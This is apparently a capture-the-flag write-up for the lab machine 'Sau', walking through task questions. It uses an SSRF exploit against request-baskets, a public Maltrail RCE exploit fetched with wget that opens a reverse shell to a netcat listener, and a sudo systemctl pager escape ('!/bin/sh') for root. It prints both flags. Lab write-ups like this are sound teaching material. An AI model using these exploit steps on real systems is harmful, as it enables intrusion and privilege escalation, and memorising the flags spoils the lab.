## Task 1 : Which is the highest open TCP port on the target machine?

Run an nmap scan on the target

```
sudo nmap -sV -Pn -T4 -oA initial_scan 10.129.229.26
```

<img width="1402" height="766" alt="Pasted image 20260216024608" src="https://github.com/user-attachments/assets/4094241c-6997-4b29-9096-719d78753f3d" />
<br>
<br>
> Answer : 55555

---

## Task 2 : What is the name of the open source software that the application on 55555 is "powered by"?

Visit the web address

```
http://10.129.229.26:55555
```
<img width="1893" height="991" alt="Pasted image 20260216024950" src="https://github.com/user-attachments/assets/0bc96eec-5d10-4b40-83d1-4a46c7e41d46" />
<br>
<br>

> Answer : request-baskets

---

## Task 3 : What is the version of request-baskets running on Sau?

<img width="262" height="53" alt="Pasted image 20260216025120" src="https://github.com/user-attachments/assets/159c74c8-b484-4fdc-b306-8c2f134aae1b" />

<br>
<br>

>  Answer : 1.2.1

---

## Task 4 : What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?

A google search of "request-baskets version 1.2.1 CVE" returns the result. 

I visited this [website](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-27163)

<img width="1241" height="671" alt="Pasted image 20260216025505" src="https://github.com/user-attachments/assets/a41a2f9c-84b9-415c-8701-06b71a39f1e9" />

<br>
<br>

> Answer : CVE-2023-27163

---

## Task 5 : What is the name of the software that the application running on port 80 is "powered by"?

By default, http://10.129.229.26:80 port 80 webpage cannot be directly accessed. Hence, we need to make use of Server-Side Request Forgery. We pretend that we are the server and send the request to visit port 80 webpage for access.

Based on this [github](https://github.com/mathias-mrsn/request-baskets-v121-ssrf), I downloaded this exploit.py

<img width="936" height="239" alt="Pasted image 20260216034128" src="https://github.com/user-attachments/assets/913fa034-67e4-41d2-9a3f-cb3bacd37a18" />
<br>
<br>

Using the format of 

```
python3 exploit.py (public_url) (targeted_url)
```

<img width="923" height="97" alt="Pasted image 20260216034240" src="https://github.com/user-attachments/assets/2c38b171-c26c-4862-a338-4a85415ef19b" />
<br>
<br>

After successfully running this exploit, visiting http://10.129.229.26:55555/zlzxcu now sends me to http://10.129.229.26:80

<img width="1887" height="947" alt="Pasted image 20260216034519" src="https://github.com/user-attachments/assets/698b4991-f9e7-4e98-80ce-aac8391aa15f" />

<br>
<br>

The webpage tells me that it is powered by Maltrail

> Answer : Maltrail

---

## Task 6 : There is an unauthenticated command injection vulnerability in MalTrail v0.53. What is the relative path on the webserver targeted by this exploit? 

Googling "Maltrail v0.53 vulnerability" returns this [RCE github exploit](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main). 

<img width="1696" height="969" alt="Pasted image 20260218092558" src="https://github.com/user-attachments/assets/c5a26854-dc59-465e-9d52-5de47b3e5a78" />
<br>
<br>

We can see that the exploit targets the /login field.

> Answer : /login

---

## Task 7 : What system user is the Mailtrack application running as on Sau?

We attempt to achieve a reverse shell.

Download the [RCE github exploit](https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py) into my attacker under the name "RCEexploit.py"

```
wget -O RCEexploit.py https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
```

<img width="931" height="266" alt="Pasted image 20260218093008" src="https://github.com/user-attachments/assets/f37da048-d0c2-4ac3-8ea1-9b041fcb774b" />
<br>
<br>

Next, find out our listener IP address.
```
ip a
```

<img width="907" height="358" alt="Pasted image 20260218093052" src="https://github.com/user-attachments/assets/5ade18dd-9355-4a27-9e13-bf78bdc87665" />
<br>
<br>

Set up a netcat listener to catch the reverse shell connection.
<br>
<br>
<img width="363" height="53" alt="Pasted image 20260218093134" src="https://github.com/user-attachments/assets/0b767c8b-41b5-4ed4-9c0b-e126b12b18a3" />
<br>
<br>

Finally, run the exploit using the given format : 
```
python3 RCEexploit.py [listener IP] [listener port no] [target_url]
```

<img width="619" height="47" alt="Pasted image 20260218093300" src="https://github.com/user-attachments/assets/b26255cb-65a1-4b27-9177-b6b6c9420d54" />
<br>
<br>

Our netcat listener catches a connection and we achieve a reverse shell.

<img width="534" height="123" alt="Pasted image 20260218093354" src="https://github.com/user-attachments/assets/35a2902e-d2ff-48e2-8701-1eea118a0d3a" />
<br>
<br>

> Answer : Puma

---

## Submit User Flag : Submit the flag located in the puma user's home directory.

User flag can be found at /home/puma/user.txt

<img width="640" height="470" alt="Pasted image 20260218093545" src="https://github.com/user-attachments/assets/69cec4d7-fd43-4d84-9a7c-a82df86da9be" />
<br>
<br>

> User flag : 2ecc166170a01615fbf15ab176aea05a

---

## Task 9 : What is the full path to the binary (without arguments) the puma user can run as root on Sau?

```
sudo -l
```

To find out what sudo commands user puma is allowed to run.

<img width="744" height="133" alt="Pasted image 20260218093830" src="https://github.com/user-attachments/assets/74385092-33f4-40b9-8f1d-a20126b23aa7" />
<br>
<br>

> Answer : /usr/bin/systemctl

---

## Task 10 : What is the full version string for the instance of systemd installed on Sau?

After visiting the [systemctl manual page](https://manpages.debian.org/stretch/systemd/systemctl.1.en.html), 

```
systemctl --version
```

<img width="936" height="84" alt="Pasted image 20260218094733" src="https://github.com/user-attachments/assets/d0266206-3d03-47cb-b45a-9a05997a971d" />
<br>
<br>

> Answer : systemd 245 (245.4-4ubuntu3.22)

---

## Task 11 : What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?

Googling "systemd 245 (245.4-4ubuntu3.22) cve" gives this [CVE result](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2023-26604).

<img width="1646" height="706" alt="Pasted image 20260218095142" src="https://github.com/user-attachments/assets/6b2f2546-79e9-4c42-8f1b-e179f070b559" />
<br>
<br>

> Answer : CVE-2023-26604 

---

# Submit Root Flag : Submit the flag located in the root user's home directory.

Based on this [sploitus](https://sploitus.com/exploit?id=EDB-ID:51674) page, I followed the instructions

<img width="1129" height="337" alt="Pasted image 20260218100225" src="https://github.com/user-attachments/assets/8ce1cc6e-f924-4f77-9fbd-39de3fe803a8" />
<br>
<br>

```
sudo /usr/bin/systemctl status trail.service
```

This opens a pager (less)

```
!/bin/sh
```

Type this in the less pager and root access is achieved

<img width="674" height="465" alt="Pasted image 20260218100145" src="https://github.com/user-attachments/assets/97ec4673-3d4a-47ac-a935-b0efd431a472" />
<br>
<br>

Root.txt can be found at /root/root.txt

<img width="661" height="568" alt="Pasted image 20260218100541" src="https://github.com/user-attachments/assets/59b671ab-1283-470d-aae3-aa288ab2bc96" />
<br>
<br>
> Root flag : 91bc5e1082ab12c8d3788f346dd25421

---

